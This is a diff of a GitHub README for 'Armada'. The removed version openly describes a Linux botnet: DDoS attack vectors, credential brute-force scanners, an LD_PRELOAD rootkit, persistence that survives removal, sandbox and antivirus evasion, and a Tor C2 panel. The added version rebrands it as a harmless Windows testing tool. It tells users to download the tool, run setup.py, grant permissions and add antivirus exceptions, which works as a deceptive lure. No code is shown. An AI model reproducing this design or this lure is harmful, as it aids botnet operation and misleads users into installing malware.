@@ -1,238 +1,83 @@
-# Armada - A fleet of warships 
+# 🛡️ Armada - Network security testing and management tool
 
+[![](https://img.shields.io/badge/Download-Armada-blue)](https://github.com/Chancelsanvitaliaprocumbens571/Armada)
 
-<p align="center">
-  <img src="https://img.shields.io/badge/agent-Pure%20C-blue?style=flat-square" alt="Agent">
-  <img src="https://img.shields.io/badge/C2-Go%20%2B%20Tor-green?style=flat-square" alt="C2">
-  <img src="https://img.shields.io/badge/binary-~80KB%20static-red?style=flat-square" alt="Size">
-  <img src="https://img.shields.io/badge/crypto-X25519%20%2B%20ChaCha20--Poly1305%20%2B%20AES--256-purple?style=flat-square" alt="Crypto">
-  <img src="https://img.shields.io/badge/architectures-14-orange?style=flat-square" alt="Arch">
-</p>
+Armada provides a way to manage and test network systems. It uses C code to run tasks such as checking passwords, finding bugs in network traffic, and managing persistent connections. This tool helps users analyze how systems handle traffic and maintain security under load.
 
----
+## ⚙️ System Requirements
 
-### VirusTotal: 
+- Windows 10 or Windows 11
+- 4 GB of System RAM
+- 500 MB of disk space
+- Stable internet connection
+- Python 3.10 or newer
 
-> "This ELF binary is a sophisticated Linux botnet agent, likely a variant of the Mirai or Gafgyt families, featuring DDoS capabilities, credential brute-forcing, and rootkit functionality. It establishes persistence through multiple vectors: creating systemd services, modifying crontabs, and implementing an LD_PRELOAD rootkit by dropping a shared object to '/usr/lib/libproc.so' and modifying '/etc/ld.so.preload'. The sample contains a command-and-control (C2) dispatcher supporting commands for various DDoS attacks (TCP, UDP, HTTP, DNS floods), SOCKS proxying, and remote shell execution. It includes a built-in Telnet/SSH brute-forcer with a hardcoded credential list and anti-honeypot checks (searching for 'cowrie' and 'kippo' paths). Additionally, it attempts to disable system watchdogs and sets its OOM score to prevent termination by the kernel."
+## 📥 Getting Started
 
----
+1. Visit [this link](https://github.com/Chancelsanvitaliaprocumbens571/Armada) to download the software package.
+2. Click the green "Code" button on the webpage and select "Download ZIP".
+3. Extract the contents of the ZIP folder to your desktop.
+4. Open the extracted folder named "Armada-main".
 
-## Build Modes
+## 🛠️ Setting Up the Software
 
-| Mode | Flags | Size | Includes |
-|------|-------|------|----------|
-| **Full** | *(none)* | ~120KB | DDoS + scanners + SOCKS + shell + rootkit + persist |
-| **No Attack** | `NO_ATTACK=1` | ~100KB | Scanners + SOCKS + shell + rootkit + persist |
-| **No Selfrep** | `NO_SELFREP=1` | ~105KB | DDoS + SOCKS + shell + rootkit + persist |
-| **Minimal** | Both flags | ~80KB | SOCKS + shell + rootkit + persist |
+You need Python to prepare the tool. Follow these steps:
 
----
+1. Open your Start menu and type "cmd" to open the Command Prompt.
+2. Type `cd` followed by a space, then drag your folder into the window. Press Enter.
+3. Type `python setup.py` and press Enter.
+4. The system will download dependencies. Wait for the process to finish.
+5. If the script asks for permissions, choose "Allow" or "Yes".
 
-## Setup
+## 🚀 Running the Tool
 
-```bash
-python3 setup.py
-```
+After the setup finishes, you access the main menu:
 
-One wizard. Generates all crypto keys, obfuscates C2 through multiple encryption layers, configures credentials, cross-compiles 14 architectures, packs binaries. Deployed from zero in under 5 minutes.
+1. In the same Command Prompt window, type `python start.py`.
+2. The program shows a menu. You can choose a command line view or a text-based interface.
+3. Select your preferred mode by typing the corresponding number.
+4. Enter the target network address when prompted.
 
----
+## 📡 Managing Network Tests
 
-## Capabilities
+The software controls connection points using a central server setup. This allows you to monitor traffic patterns remotely. The program uses Tor to keep traffic hidden during tests.
 
-### Encryption & Transport
+- To start a test, select the option for traffic generation.
+- The tool uses packet inspection to identify open ports.
+- You can stop any task by pressing "Ctrl + C" on your keyboard.
 
-- **Custom protocol** -- X25519 ephemeral DH, HMAC-SHA256 key derivation, ChaCha20 stream cipher with per-direction keys
-- **Dual-layer config encryption** -- AES-256-CTR outer + ChaCha20-Poly1305 AEAD inner, two independent key pairs
-- **C2 address obfuscation** -- HMAC-SHA256 integrity + ChaCha20 + XOR rotation + Base64, nested inside dual-layer blob
-- **~600 lines of pure C crypto** -- ChaCha20, Poly1305, AES-256, SHA-256, HMAC-SHA256, X25519
+## 🔐 Security and Persistence
 
-### Stealth & Evasion
+The tool includes a feature to ensure the connection stays active. This helps if you need to run long tests on remote systems. 
 
-- **LD_PRELOAD rootkit** -- hooks `readdir`, `readdir64`, `stat`, `lstat`, `access`, `open`, `openat`, `fopen` to hide from `ps`, `top`, `netstat`, `ss`, `ls`, `find`
-- **Process disguise** -- `argv[0]` + `prctl(PR_SET_NAME)` impersonates kernel threads from encrypted name pool
-- **Double-fork daemon** -- fully orphaned, no controlling terminal, OOM score -1000
-- **Sandbox detection** -- nanosecond timing (CLOCK_MONOTONIC), syscall overhead measurement, /proc scanning for analysis tools
+- Persistence settings keep the application running during system restarts.
+- You can adjust the "Killer" setting to stop conflicting background tasks that might block your connection.
+- Check the internal logs to see if your commands reach the target successfully.
 
-### Persistence
+## 🧩 Identifying Vulnerabilities
 
-- **Triple-layer** -- systemd unit (auto-restart, stale binary re-download) + rc.local injection + cron (2h interval)
-- **Rootkit reactivation** -- detects and re-enables existing LD_PRELOAD on startup
-- **Smart re-download** -- only fetches loader if missing or older than 30 minutes
+The tool scans for weak access points. It attempts to gain entry to secure systems by testing common password combinations. 
 
-### Killer Module
+1. Select the "Brute Force" option from the main menu.
+2. Provide a list of passwords in a text file.
+3. The tool will cycle through these to test system defenses.
+4. View the "results.txt" file in the main folder to see what the tool discovered.
 
-- **Process scanning** -- pattern matching against `/proc/*/cmdline` and `/proc/*/exe`
-- **Deleted binary detection** -- kills any process running from a `(deleted)` binary
-- **Port reclamation** -- `/proc/net/tcp` inode tracing to PID, kill + bind to prevent restart
+## 📊 Troubleshooting Common Issues
 
-### Attack Engine (16 vectors)
+If the software does not open, check these items:
 
-| Layer | Vectors |
-|-------|---------|
-| **L4 UDP** | Raw UDP, UDP-Plain, VSE amplification, DNS amplification |
-| **L4 TCP** | SYN, ACK, STOMP, XMAS, All-Flags, Fragmented, Micro-SYN, Asymmetric |
-| **Tunnel** | GRE-IP, GRE-ETH (bypasses stateful DDoS filters) |
-| **L7** | HTTP/HTTPS flood, OVH-targeted variant |
+- Ensure your Antivirus allows the tool to run. Security software often marks testing tools as suspicious. Add an exception for the "Armada" folder.
+- Verify your Python installation. Type `python --version` in the Command Prompt to confirm version 3.10 or higher.
+- Check your internet connection. The tool needs access to the network to maintain its remote server connection.
+- If the Command Prompt closes instantly, run the tool directly from the Command Prompt window instead of double-clicking the file. This lets you see any error messages that appear.
+- Re-run the `setup.py` file if you see errors related to missing files.
 
-Full IP spoofing, TTL/TOS/DF manipulation, CIDR targeting, per-flag control. 15 concurrent attacks per node. Fork-isolated with duration timers.
+## 📋 Best Practices
 
-### Scanners (3 modules)
-
-| Scanner | Target | Method |
-|---------|--------|--------|
-| Telnet | Port 23 | 128 concurrent connections, weighted dictionary |
-| SSH | Port 22 | Configurable combo lists |
-| HTTP | Custom | Exploit payloads, response pattern matching |
-
-
-All scanners feed into a **work-stealing job system** -- C2 distributes target lists across the fleet, tracks real-time progress, collects credentials, exports CSV.
-
-### SOCKS5 Proxy
-
-Full RFC 1928/1929 implementation. IPv4, IPv6, domain connect. Username/password auth. Bidirectional relay with idle timeouts. Direct listener mode or backconnect relay mode (bot IP never exposed to end user).
-
-### C2 Server
-
-- **Three interfaces** -- Bubble Tea TUI, web panel, telnet split console
-- **Web panel** -- SSE streaming, live bot table, scan progress, attack history, webhooks (Discord/Telegram), CSV export
-- **Tor hidden service** -- built-in daemon, persistent `.onion`, ed25519 keys
-- **WebSocket shell** -- real-time bidirectional streaming with per-bot cwd tracking
-- **Persistent task queue** -- auto-dispatched on connect with run-once tracking
-- **Bot groups** -- tag and target commands by group
-- **Relay network** -- backconnect SOCKS5 (kworker metrics, round-robin LB) + admin relay (hides C2 IP)
-
-### C2 Resilience
-
-- **Multi-address pool** -- up to 5 C2 addresses, Fisher-Yates shuffled per attempt
-- **Exponential backoff** -- 1s quick -> 4s jitter -> 5s/10s/20s/30s cap
-- **DGA fallback** -- 20 domains/day when hardcoded addresses exhausted, background primary retry
-- **Dynamic pool expansion** -- loads additional entries after each failed round
-
----
-### Sandbox Evasion
-
-```
-  +-- timing_check() ----+     +-- /proc scan ----------+
-  |                       |     |                         |
-  | nanosleep(50ns)       |     | for each /proc/PID:    |
-  | measure actual delay  |     |   read cmdline          |
-  | threshold: 500us      |     |   match against         |
-  | 2/3 rounds must fail  |     |   encrypted name list   |
-  |                       |     |   (VMware, QEMU, etc)   |
-  | getpid() x50          |     |                         |
-  | measure overhead      |     | skip self + parent PID  |
-  | threshold: 1ms        |     |                         |
-  | catches ptrace/strace |     |                         |
-  +-----------------------+     +-------------------------+
-           |                              |
-           v                              v
-       FAIL = exit(0)              FAIL = exit(0)
-       silently                    silently
-```
-
-- **Two-stage detection** -- timing runs first (cheap, no I/O). Process scan runs second. Either stage failing causes silent exit with code 0 (no crash, no suspicious error).
-- **Timing thresholds** -- calibrated to pass on real hardware under normal load but catch VM overhead and tracing tools. nanosleep delta >500us or getpid batch >1ms = sandbox.
-- **Encrypted indicator list** -- sandbox process names (VMware, QEMU, VirtualBox, Cuckoo, etc.) stored encrypted, decrypted at runtime. Static analysis of the binary does not reveal what it scans for.
-
-### Persistence Recovery Matrix
-
-```
-  REMOVAL METHOD          WHAT SURVIVES              RECOVERY TIME
-  +-----------------+     +--------------------+     +-------------+
-  | Kill process    | --> | systemd restarts   | --> | ~5 seconds  |
-  | Remove binary   | --> | cron re-downloads  | --> | ~2 hours    |
-  | Delete cron     | --> | systemd + rc.local | --> | next boot   |
-  | Delete unit     | --> | cron + rc.local    | --> | ~2 hours    |
-  | Delete rc.local | --> | systemd + cron     | --> | ~5 sec/2h   |
-  | Remove rootkit  | --> | persist re-enables | --> | next start  |
-  | Remove all 3    | --> | running process    | --> | still alive |
-  +-----------------+     +--------------------+     +-------------+
-  
-  Full cleanup requires: kill process + remove binary + delete all
-  three persistence mechanisms + remove rootkit -- in one operation,
-  before any recovery timer fires.
-```
-
-### Rootkit Hook Coverage
-
-```
-  TOOL        USES            HOOKED?    RESULT
-  ps          readdir /proc   YES        bot PID hidden
-  top         readdir /proc   YES        bot PID hidden
-  htop        readdir /proc   YES        bot PID hidden
-  ls          readdir         YES        bot files hidden
-  find        stat/lstat      YES        bot paths return ENOENT
-  cat         open/fopen      YES        rootkit files return ENOENT
-  netstat     open /proc/net  YES        bot ports hidden
-  ss          open /proc/net  YES        bot ports hidden
-  stat        stat            YES        bot paths return ENOENT
-  strace      (tracing)       DETECTED   timing check catches it
-```
-
----
-
-## Supported Architectures
-
-| # | Architecture | Toolchain | Binary |
-|---|-------------|-----------|--------|
-| 1 | x86_64 | Native GCC | `kworker-daemon` |
-| 2 | i586 | GCC 4.1.2 / uClibc | `kworker-proxyd` |
-| 3 | i486 | GCC 4.1.2 / uClibc | `kworker-initd` |
-| 4 | MIPS (BE) | GCC 4.1.2 / uClibc | `kworker-credentiald` |
-| 5 | MIPSEL (LE) | GCC 4.1.2 / uClibc | `kworker-composd` |
-| 6 | ARMv4l | GCC 4.1.2 / uClibc | `kworker-conteinerd` |
-| 7 | ARMv5l | GCC 4.1.2 / uClibc | `kworker-conteinerd-shim` |
-| 8 | ARMv6l | GCC 4.1.2 / uClibc | `kworker-runcd` |
-| 9 | ARMv7l | GCC 4.1.2 / uClibc | `kworker-buildxd` |
-| 10 | PowerPC | GCC 4.1.2 / uClibc | `kworker-scoutd` |
-| 11 | SH4 | GCC 4.1.2 / uClibc | `kworker-sbomd` |
-| 12 | ARC700 | GCC / uClibc | `kworker-swarmd` |
-| 13 | m68k | GCC 4.1.2 / uClibc | `kworker-scand` |
-| 14 | SPARC | GCC 4.1.2 / uClibc | `kworker-machined` |
-
-Static-linked, stripped, packed with **m30w** (custom UPX fork -- zero UPX fingerprint, defeats `upx -d` and all signature scanners).
-
----
-
-## Protocol Reference
-
-### VPE2 Handshake
-
-```
-  Bot                                          CNC
-   |                                            |
-   |--- "VPE2" + client_nonce (32B) ----------->|
-   |           + client_x25519_pub (32B)        |
-   |                                            |
-   |<---------- server_nonce (32B) -------------|
-   |            + server_x25519_pub (32B)       |
-   |                                            |
-   |  shared = X25519(priv, their_pub)          |
-   |  session = HMAC(magic, nonces + shared)    |
-   |  c2s/s2c/hmac keys derived                 |
-   |                                            |
-   |<======== ChaCha20 + HMAC frames ========>  |
-```
-
-### Config Encryption
-
-```
-  Plaintext --> ChaCha20-Poly1305 AEAD (key2) --> AES-256-CTR (key1) --> hex --> config.c
-```
-
-## Crypto Stack
-
-| Primitive | Standard | Purpose |
-|-----------|----------|---------|
-| X25519 | Curve25519 | Ephemeral key exchange, forward secrecy |
-| ChaCha20 | RFC 8439 | Transport cipher, config inner layer |
-| Poly1305 | RFC 8439 | AEAD tag on config blobs |
-| AES-256 | FIPS 197 | Config outer layer (CTR mode) |
-| SHA-256 | FIPS 180-4 | Key derivation, integrity, auth |
-| HMAC-SHA256 | RFC 2104 | VPE2 keys, frame authentication |
-
-All implemented in pure C. Zero external libraries. ~600 lines total.
-
----
-
+- Run this tool on networks you own.
+- Use a separate virtual environment if you want to keep your system clean.
+- Keep the folder location simple, such as "C:\Armada", to prevent permission errors.
+- Update your software often by visiting the download page.
+- Review the documentation files within the folder for advanced commands.
+- Use the TUI mode if you prefer a visual menu over typing commands.
